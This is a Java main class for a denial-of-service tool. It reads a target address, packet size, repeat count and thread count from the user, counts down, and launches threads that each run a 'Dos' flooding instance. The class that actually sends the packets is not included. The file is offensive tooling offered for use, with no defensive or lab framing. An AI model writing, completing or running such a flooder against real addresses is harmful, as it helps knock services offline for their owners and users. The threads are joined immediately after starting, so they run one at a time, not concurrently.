package com.company;

import java.util.Scanner;

public class Main {

    public static void main(String[] args) {

        getInformation();
        System.out.println("Dos attack finished!");

    }

    public static void getInformation(){
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter the target address: ");
        String address = scanner.nextLine();
        System.out.println();
        System.out.print("Enter the packet size: ");
        int packetSize = scanner.nextInt();
        System.out.println();
        System.out.print("Enter how many times you want to send the packets: ");
        long timeToSendPackets = scanner.nextInt();
        System.out.println();
        System.out.print("Enter how many threads you want: ");
        int threadsNumber = scanner.nextInt();

        System.out.println("Attack is starting in:");
        for(int i = 3; i >= 1; i--){
            System.out.println("***" + i + "***");
            try {
                Thread.sleep(1000);
            }
            catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        startAttack(address, packetSize,timeToSendPackets,threadsNumber);
    }

    public static void startAttack(String address, int packetSize, long timeToSendPackets, int threadsNumber) {
        for(int i = 0; i < threadsNumber; i++){
            Thread temp = new Thread(createDosInstance(address,packetSize,timeToSendPackets));
            temp.start();
            try {
                temp.join();
            }
            catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public static Dos createDosInstance(String address, int packetSize, long timeToSendPackets){
        return new Dos(address, packetSize,timeToSendPackets);
    }
}
